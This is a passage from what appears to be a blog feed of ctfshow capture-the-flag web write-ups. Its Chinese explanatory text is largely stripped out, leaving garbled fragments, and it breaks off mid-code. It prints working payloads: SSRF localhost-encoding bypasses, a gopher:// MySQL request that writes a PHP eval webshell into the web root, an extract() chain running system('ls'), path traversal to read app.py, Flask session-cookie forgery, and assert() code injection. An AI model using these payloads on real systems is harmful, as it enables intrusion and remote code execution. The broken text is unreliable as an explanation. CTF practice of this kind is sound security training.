punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.php.net/manual/zh/function.parse-url.php"><strong>parse_url</strong> </a></p><blockquote><p>parse_url   URL</p></blockquote><blockquote><p>curl_setopt  cURL</p><p>ch</p><p> curl_init()  cURL </p><p>option</p><p>CURLOPT_XXX</p><p>value</p><p>option</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//cURL</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//RUL</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'www.baidu.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//  </span><span class="token comment">//1,0</span><span class="token comment">//curl_exec()</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//TRUE curl_exec() </span><span class="token comment">//1$html,0echo $html</span><span class="token comment">//cURL</span><span class="token variable">$html</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//surl</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//  CURLOPT_RETURNTRANSFERfasle</span><span class="token comment">//echo $html;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>127.1127.0.0.1Linux0127.0.0.1127.0.0.0/8127.0.0.1 ~ 127.255.255.254localhostipIP</code></pre><p><img src="https://img-blog.csdnimg.cn/168e616aefc948da8c4c5279035d9f78.png" alt="1"></p><blockquote><p>url&#x3D;<a href="http://127.0.0.1/flag.php">http://2130706433/flag.php</a><br>url&#x3D;<a href="http://127.0.0.1/flag.php">http://0x7F.0.0.1/flag.php</a><br>url&#x3D;<a href="http://127.0.0.1/flag.php">http://0177.0.0.1/flag.php</a><br>url&#x3D;<a href="http://127.0.0.1/flag.php">http://0x7F000001/flag.php</a> 127.0.0.1127.1<br>CIDRurl&#x3D;<a href="http://127.127.127.127/flag.php%E5%92%8C">http://127.127.127.127/flag.php</a> url&#x3D;<a href="http://0.0.0.0/flag.php">http://0/flag.php</a><br>url&#x3D;<a href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></p></blockquote><h2 id="354"><a href="#354" class="headerlink" title="354"></a>354</h2><p><strong><a href="http://sudo.cc/">http://sudo.cc</a></strong>127.0.0.1<br>payload<code>url=http://sudo.cc/flag.php</code></p><h2 id="355"><a href="#355" class="headerlink" title="355"></a>355</h2><p>payload:<code>url=http://0/flag.php</code></p><h2 id="356"><a href="#356" class="headerlink" title="356"></a>356</h2><p>payload:<code>url=http://0/flag.php</code></p><h2 id="357"><a href="#357" class="headerlink" title="357"></a>357</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;/br>'</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_IP</span><span class="token punctuation">,</span> <span class="token class-name">FILTER_FLAG_NO_PRIV_RANGE</span> <span class="token operator">|</span> <span class="token class-name">FILTER_FLAG_NO_RES_RANGE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ip!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>gethostbyname </p></blockquote><blockquote><p>filter_var() <br> false</p></blockquote><blockquote><p>FILTER_FLAG_NO_PRIV_RANGE -  RFC  IP  192.168.0.1<br>FILTER_FLAG_NO_RES_RANGE -  IP  IPV4  IPV6 </p></blockquote><p><strong>RFC1918?</strong></p><blockquote><p>A10.0.0.0&#x2F;810.0.0.0<del>10.255.255.255<br>B172.16.0.0&#x2F;12172.16.0.0</del>172.31.255.255<br>C192.168.0.0&#x2F;16192.168.0.0~192.168.255.255</p></blockquote><h2 id="358"><a href="#358" class="headerlink" title="358"></a>358</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^http:\/\/ctf\..*show$/i'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>lctf.show</p><pre><code>parse_url()@userfile_get_contents()host:port/pathuser</code></pre><p><img src="https://img-blog.csdnimg.cn/95d0f8a3ff4c4339b93d58388abd9559.png" alt="1"></p><h2 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h2><p><strong>mysql</strong><br>check.php<br><img src="https://img-blog.csdnimg.cn/cb3f6d8d75444bd588df83cb2cc1fa85.png" alt="1">wpgopherMYSQL,,<a href="https://github.com/tarunkant/Gopherus">gopherus</a></p><p><img src="https://img-blog.csdnimg.cn/95522062ea2144718161ffab303b9848.png" alt="2"><br>MySQL<br><code>select &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &#39;/var/www/html/2.php&#39;;</code></p><blockquote><p>MySQLPHP&#x2F;var&#x2F;www&#x2F;html&#x2F;2.php<br>PHP<?php @eval($_POST['cmd']);?>PHPcmdPOSTcmdPHP<br>WebPOST</p></blockquote><p><img src="https://img-blog.csdnimg.cn/0b40b99caeea4464bd7f897232c326cf.png" alt="3"><br>**_**urlurl<br>check.phppost<br><code>returl=gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254b%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2527%2563%256d%2564%2527%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2532%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501</code><br>2.php2.phpflag</p><h2 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h2><p><strong>redis</strong><br>redis<strong>6379</strong><br>redis</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow </title>
      <link href="/2023/02/27/ctfshow-%E8%8F%9C%E7%8B%97%E6%9D%AF/"/>
      <url>/2023/02/27/ctfshow-%E8%8F%9C%E7%8B%97%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id=""><a href="#" class="headerlink" title="$"></a>$</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-11-10 17:20:38# @Last Modified by:   h1xa# @Last Modified time: 2022-11-11 08:21:54# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>_&#x3D;a$<em>&#x3D;a;a&#x3D;b$$</em>&#x3D;b</p><h3 id="extract-"><a href="#extract-" class="headerlink" title="extract()"></a>extract()</h3><p>extract() </p><p></p><p> type extract() </p><p></p><p>36<br></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> strings<span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_letterst<span class="token operator">=</span><span class="token string">'_=a&amp;'</span>code<span class="token operator">=</span><span class="token string">"system('ls');"</span><span class="token comment">#</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token operator">+=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'='</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'&amp;'</span>t<span class="token operator">+=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'='</span><span class="token operator">+</span>code<span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>_a&amp;a&#x3D;b&amp;b&#x3D;c&amp;c&#x3D;d&amp;d&#x3D;e&amp;e&#x3D;f&amp;f&#x3D;g&amp;g&#x3D;h&amp;h&#x3D;i&amp;i&#x3D;j&amp;j&#x3D;k&amp;k&#x3D;l&amp;l&#x3D;m&amp;m&#x3D;n&amp;n&#x3D;o&amp;o&#x3D;p&amp;p&#x3D;q&amp;q&#x3D;r&amp;r&#x3D;s&amp;s&#x3D;t&amp;t&#x3D;u&amp;u&#x3D;v&amp;v&#x3D;w&amp;w&#x3D;x&amp;x&#x3D;y&amp;y&#x3D;z&amp;z&#x3D;A&amp;A&#x3D;B&amp;B&#x3D;C&amp;C&#x3D;D&amp;D&#x3D;E&amp;E&#x3D;F&amp;F&#x3D;G&amp;G&#x3D;H&amp;H&#x3D;I&amp;I&#x3D;J&amp;I&#x3D;system(ls);</p></blockquote><p>flag<br>**cd ..&#x2F;..&#x2F;..&#x2F;**<br><img src="https://img-blog.csdnimg.cn/6741037228374d4f8e44c02254957c7a.png" alt="1"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><img src="https://img-blog.csdnimg.cn/c0f37ae3ffc04bc9bdcb011c5223db0f.png" alt="1"><strong></strong></p><p><img src="https://img-blog.csdnimg.cn/b2f80d87ab79442899aa7c1789dabc7c.png" alt="2"><br><strong><a href="http://c5911a6c-20fd-4771-b630-967baf205874.challenge.ctf.show/download?file=1">http://c5911a6c-20fd-4771-b630-967baf205874.challenge.ctf.show/download?file=1</a></strong><strong>app.py</strong><a href="https://blog.csdn.net/weixin_45007073/article/details/113466902#:~:text=%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%201%20%E5%9C%A8URL%E5%86%85%E4%B8%8D%E8%A6%81%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E7%A7%B0%E4%BD%9C%E4%B8%BA%E5%8F%82%E6%95%B0%202%20%E6%A3%80%E6%9F%A5%E4%BD%BF%E7%94%A8%E8%80%85%E8%BE%93%E5%85%A5%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8D%E6%98%AF%E5%90%A6%E6%9C%89%E2%80%9C%E2%80%A6%E2%80%9D%E7%9A%84%E7%9B%AE%E5%BD%95%E9%98%B6%E5%B1%82%E5%AD%97%E7%AC%A6%203,%E5%9C%A8php.ini%E6%96%87%E4%BB%B6%E4%B8%AD%E8%AE%BE%E7%BD%AEopen_basedir%E6%9D%A5%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E7%9A%84%E7%9B%AE%E5%BD%95%204%20%E4%BD%BF%E7%94%A8realpath%E5%87%BD%E6%95%B0%E6%9D%A5%E5%B1%95%E5%BC%80%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E4%B8%AD%E7%9A%84%E2%80%9C.%2F%E2%80%9D%E3%80%81%20%E2%80%9C%E2%80%A6%2F%E2%80%9D%E7%AD%89%E5%AD%97%E7%AC%A6%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%94%E5%9B%9E%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%90%8D%E7%A7%B0%205%20%E4%BD%BF%E7%94%A8basename%E5%87%BD%E6%95%B0%E6%9D%A5%E8%BF%94%E5%9B%9E%E4%B8%8D%E5%8C%85%E5%90%AB%E8%B7%AF%E5%BE%84%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8D%E7%A7%B0"></a><code>http://c5911a6c-20fd-4771-b630-967baf205874.challenge.ctf.show/download?file=../../app.py</code>app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env python</span><span class="token comment"># -*-coding:utf-8 -*-</span><span class="token triple-quoted-string string">"""# File       : app.py# Time       2022/11/07 09:16# Author     g4_simon# version    python 3.9.7# Description~"""</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">import</span> random<span class="token keyword">from</span> flag <span class="token keyword">import</span> flag<span class="token comment">#</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'tanji_is_A_boy_Yooooooooooooooooooooo!'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getwifi'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getwifi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span>    wifi<span class="token operator">=</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'static/img'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'current_wifi'</span><span class="token punctuation">]</span><span class="token operator">=</span>wifi    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'getwifi.html'</span><span class="token punctuation">,</span>wifi<span class="token operator">=</span>wifi<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     filename<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> filename<span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">'static/img/'</span><span class="token operator">+</span>filename<span class="token punctuation">,</span>as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/secret_path_U_never_know'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span>flag<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>wpflasksessioncookieflag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/secret_path_U_never_know'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span>flag<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><p><img src="https://img-blog.csdnimg.cn/57f0cfe9178e4930ad0c0a8885f3a123.png" alt="1"><br>sessionisadminSECRET_KEYisadminSECRET_KEYsession<br><a href="https://github.com/noraj/flask-session-cookie-manager">github</a>kali<br><img src="https://img-blog.csdnimg.cn/7eea38bdf10a46e58e10b3f7980efa98.png" alt="2"><br>session<code>http://9bae1f73-6d1c-4258-a734-cf6bed842746.challenge.ctf.show/secret_path_U_never_know</code><br>hackbarcookiesessionflag</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>  <span class="token comment">//flag.php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">114514</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"intval(<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span>num<span class="token punctuation">]</span></span>)==1919810"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>getnumnum114514<br><code>assert(&quot;intval($_GET[num])==1919810&quot;) or die(&quot;!&quot;);</code><br> GET  num  1919810<br><strong></strong><code>?num=114514);//</code>php<code>114514);//</code><strong>114514</strong><strong>assert</strong><code>assert(&quot;intval($_GET114514);//)==1919810&quot;) or die(&quot;!&quot;);</code><code>echo $flag;</code>flag<br><img src="https://img-blog.csdnimg.cn/da7eab8fd3c44e4bb95ac6cf0a9cf4f3.png" alt="1"></p><blockquote><p>php:<br>&#x3D;&#x3D;<br>&#x3D;&#x3D;&#x3D;<br>&#x3D;&#x3D;,<br>var_dump(a &#x3D;&#x3D; 0);&#x2F;&#x2F;trueaa0<br>var_dump(123a &#x3D;&#x3D; 123);&#x2F;&#x2F;true123a123<br>var_dump(a123 &#x3D;&#x3D; 123);&#x2F;&#x2F;falsephp0</p></blockquote><p><code>/?num=114514%2B1805296</code>url**%2B**flag</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">114514</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 